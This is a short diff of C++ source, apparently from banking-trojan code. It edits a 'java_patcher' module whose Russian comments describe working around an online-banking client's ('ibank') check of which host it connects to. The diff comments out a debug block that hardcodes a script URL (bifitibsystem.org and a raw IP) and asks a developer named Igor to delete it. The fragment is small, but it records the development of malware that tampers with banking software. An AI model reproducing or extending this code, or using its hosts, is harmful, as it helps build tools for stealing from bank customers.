@@ -17,7 +17,7 @@
 #include "Richedit.h"
 
 
-#include "BotDebug.h"
+//#include "BotDebug.h"
 
 namespace java_patcher
 {
@@ -147,10 +147,22 @@ static char* GetJavaPatcherURL( char* url )
 {
 	// Функция возвращает адрес скрипта
 
-    #ifdef DEBUGCONFIG
+	/*
+
+	Не удалил код чтоб обратить на него внимание.
+	дебаговый хост прописан в модуле JavaConfig.h
+	Это важно потому, что в ибанке проверяется к
+	какому хосту идёт подключение, соответственно если
+	прописать хост здесь то ибанк не корректно
+	отрабатывает в отладочной версии
+
+	Игорь, как прочитаешь этот коммент, удали код.
+
+	#ifdef DEBUGCONFIG
 		m_lstrcpy( url, "http://bifitibsystem.org/" );//"http://94.240.148.127/");//);//rt_jar/");
 		return url;
 	#endif
+	*/
 
 	PCHAR URL = NULL;
 	do
